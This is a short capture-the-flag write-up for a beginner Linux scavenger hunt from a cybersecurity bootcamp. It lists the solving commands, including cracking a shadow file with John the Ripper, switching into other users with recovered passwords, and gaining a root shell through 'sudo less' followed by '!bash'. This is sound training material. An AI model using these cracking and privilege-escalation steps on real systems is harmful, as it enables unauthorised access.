# Linux Scavenger Hunt 
This CTF is the first one I ever did when I just started learning about Linux. It was hosted by the University of Toronto Cybersecurity Bootcamp in January 2025.

### **🚩flag\_1:**

*Finding this flag is imperative to moving on quickly, as it contains the passwords from users before they were hacked. Luckily, it doesn't have a great hiding spot.*

`grep -r "flag_1" /`

Flag_1 was located in `/home/student/Desktop/`. A hidden file. 
Could have simply navigated to the Desktop and ran `ls -la`.
### **🚩flag\_2:**

*A famous hacker had created a user on the system a year ago. Find this user, crack their password, and log in to their account.*

`home/student/Documents/my-files/shadow`

`john --wordlist=.pass_list.txt ../Documents/my-files/shadow`

`user: mitnick`
`Password: trustno1`

`su mitnick`
### **🚩flag\_3:**

*Find a log file related to the hacker's name and a zip file with additional info.Use a compound command to figure out the unique count of IP addresses in this log file. That number is a password.*  
    - *Hint: Use the unzip command to open any zip files you may find.*  
    - *Note: To unzip the zip file, use the unzip command.*

Found in `/var/log/mitnick.log`

`awk '{print $1}' mitnick.log | sort | uniq | wc -l`

`102`

### **🚩flag\_4:**

*Find a directory with a list of hackers. Look for a file that has read permissions for the owner, no permissions for groups, and executable only for everyone else.*

babbage/Documents/stallman = computer
woz = (nothing)
gates = (nothing)
gosling = (nothing)

`su stallman` Password: `computer`

### **🚩flag\_5:**

*This user is writing a Bash script, except it isn't quite working yet. Find it, debug it, and run it.*

`home/stallman/Documents/flag5.sh`

remove extra 'do' in the script and add ; then run it.

### **🚩flag\_6:**

*Inspect this user's custom aliases and run the suspicious one for the proper flag.*

### **🚩flag\_7:**

*Find an exploit to gain a root shell. Log in as the root user.*

`sudo less /etc/passwd`

`!bash`
hit enter
### **🚩flag\_8:**

*Gather each of the 7 flags into a file and format it as if each flag was a username and password.*

🚩🚩🚩 *Crack these passwords for the final flag.* 🚩🚩🚩


